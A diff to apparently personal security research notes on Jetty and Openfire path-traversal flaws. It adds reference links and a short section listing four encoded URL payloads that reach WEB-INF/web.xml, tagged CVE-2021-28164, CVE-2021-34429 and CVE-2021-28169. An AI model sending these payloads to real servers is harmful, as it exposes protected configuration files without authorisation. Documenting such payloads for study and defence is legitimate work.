@@ -178,4 +178,19 @@ this._decodedPath = URIUtil.canonicalPath(decodedNonCanonical)
 ## Ref
 - https://mp.weixin.qq.com/s/cuULlP0F0Xf9Rhmkb-9H0g
 - https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w
+- https://mp.weixin.qq.com/s/GeDkZrqq9EsBdxwKmiPmGw
 - https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
+
+## Jetty其他的漏洞相关
+```py
+# payload[0] ="/%2e/WEB-INF/web.xml" CVE-2021-28164
+# payload[1] ="/%u002e/WEB-INF/web.xml" CVE-2021-34429
+# payload[2] ="/.%00/WEB-INF/web.xml" CVE-2021-34429
+# payload[3] ="/static?/%2557EB-INF/web.xml" CVE-2021-28169
+```
+
+- https://github.com/cwh945/JETTY-POC/blob/c40c4721a9c819268d5ba3767c9e08019fbda90a/CVE-2021-34429-jetty.py#L15
+- https://mp.weixin.qq.com/s/QAqj-UbkLboaiE2FdMDB7A
+- [CVE-2021-34429 jetty.project advisories](https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm)
+- https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
+- https://wx.zsxq.com/dweb2/index/topic_detail/218522852144241
